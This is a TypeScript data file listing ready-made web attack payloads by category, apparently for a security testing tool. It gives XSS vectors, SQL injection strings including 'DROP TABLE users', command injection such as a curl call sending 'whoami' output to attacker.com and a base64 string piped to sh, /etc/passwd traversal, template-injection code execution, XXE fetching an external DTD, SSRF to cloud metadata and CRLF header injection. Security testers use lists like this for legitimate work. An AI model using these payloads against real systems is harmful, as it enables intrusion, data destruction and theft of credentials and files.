/** Payload 分组数据 */
export interface PayloadItem {
  label: string;
  value: string;
}

export interface PayloadGroup {
  key: string;
  title: string;
  items: PayloadItem[];
}

export const PAYLOAD_GROUPS: PayloadGroup[] = [
  {
    key: 'xss',
    title: 'XSS',
    items: [
      { label: '基础弹窗', value: '<script>alert(1)</script>' },
      { label: 'IMG onerror', value: '<img src=x onerror=alert(1)>' },
      { label: 'SVG onload', value: '<svg onload=alert(1)>' },
      { label: 'Event handler', value: '" onfocus="alert(1)" autofocus="' },
      { label: 'Body onload', value: '<body onload=alert(1)>' },
      { label: 'Input onfocus', value: '<input onfocus=alert(1) autofocus>' },
      { label: 'Iframe srcdoc', value: '<iframe srcdoc="<script>alert(1)</script>">' },
      { label: 'Details open', value: '<details open ontoggle=alert(1)>' },
      { label: 'Bypass filter', value: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
      { label: 'Unicode bypass', value: '<script>alert\u0060XSS\u0060</script>' },
    ],
  },
  {
    key: 'sqli',
    title: 'SQL 注入',
    items: [
      { label: '万能密码', value: "' OR '1'='1' --" },
      { label: 'UNION 查询', value: "' UNION SELECT 1,2,3 --" },
      { label: '报错注入', value: "' AND 1=CONVERT(int,(SELECT @@version)) --" },
      { label: '时间盲注', value: "' AND SLEEP(5) --" },
      { label: '布尔盲注', value: "' AND 1=1 --" },
      { label: 'MySQL 版本', value: "' UNION SELECT @@version --" },
      { label: '堆叠注入', value: "'; DROP TABLE users; --" },
      { label: 'ORDER BY 探测', value: "' ORDER BY 10 --" },
      { label: 'extractvalue', value: "' AND extractvalue(1,concat(0x7e,(SELECT user()))) --" },
      { label: 'updatexml', value: "' AND updatexml(1,concat(0x7e,(SELECT database())),1) --" },
    ],
  },
  {
    key: 'cmd-injection',
    title: '命令注入',
    items: [
      { label: '管道符', value: '| whoami' },
      { label: '分号拼接', value: '; whoami' },
      { label: '与操作', value: '&& whoami' },
      { label: '反引号', value: '`whoami`' },
      { label: '$(cmd)', value: '$(whoami)' },
      { label: 'Ping 探测', value: '| ping -c 3 127.0.0.1' },
      { label: 'curl 外带', value: '| curl http://attacker.com/$(whoami)' },
      { label: 'base64 绕过', value: '| echo d2hvYW1p | base64 -d | sh' },
    ],
  },
  {
    key: 'path-traversal',
    title: '路径穿越',
    items: [
      { label: '基础穿越', value: '../../../../etc/passwd' },
      { label: 'Windows', value: '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
      { label: 'URL 编码', value: '..%2f..%2f..%2fetc%2fpasswd' },
      { label: '双重编码', value: '..%252f..%252f..%252fetc%252fpasswd' },
      { label: 'Null byte', value: '../../../../etc/passwd%00.jpg' },
      { label: 'UTF-8 编码', value: '..%c0%af..%c0%afetc/passwd' },
    ],
  },
  {
    key: 'ssti',
    title: 'SSTI 模板注入',
    items: [
      { label: 'Jinja2 检测', value: '{{7*7}}' },
      { label: 'Twig 检测', value: '{{7*\'7\'}}' },
      { label: 'Freemarker', value: '${7*7}' },
      { label: 'Jinja2 RCE', value: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}" },
      { label: 'Mako', value: '${__import__("os").popen("whoami").read()}' },
      { label: 'Smarty', value: '{system("whoami")}' },
    ],
  },
  {
    key: 'xxe',
    title: 'XXE',
    items: [
      { label: '文件读取', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
      { label: 'SSRF 探测', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>' },
      { label: 'Parameter entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>' },
    ],
  },
  {
    key: 'ssrf',
    title: 'SSRF',
    items: [
      { label: 'localhost', value: 'http://127.0.0.1' },
      { label: '0.0.0.0', value: 'http://0.0.0.0' },
      { label: 'IPv6 localhost', value: 'http://[::1]' },
      { label: '十进制IP', value: 'http://2130706433' },
      { label: '八进制IP', value: 'http://0177.0.0.1' },
      { label: 'AWS metadata', value: 'http://169.254.169.254/latest/meta-data/' },
      { label: 'file 协议', value: 'file:///etc/passwd' },
      { label: 'dict 协议', value: 'dict://127.0.0.1:6379/info' },
      { label: 'gopher 协议', value: 'gopher://127.0.0.1:6379/_INFO' },
    ],
  },
  {
    key: 'header-injection',
    title: 'HTTP Header 注入',
    items: [
      { label: 'CRLF 注入', value: '%0d%0aSet-Cookie:hacked=true' },
      { label: 'Host 头注入', value: 'evil.com' },
      { label: 'X-Forwarded-For', value: '127.0.0.1' },
      { label: 'Referer 欺骗', value: 'https://trusted-site.com' },
    ],
  },
];

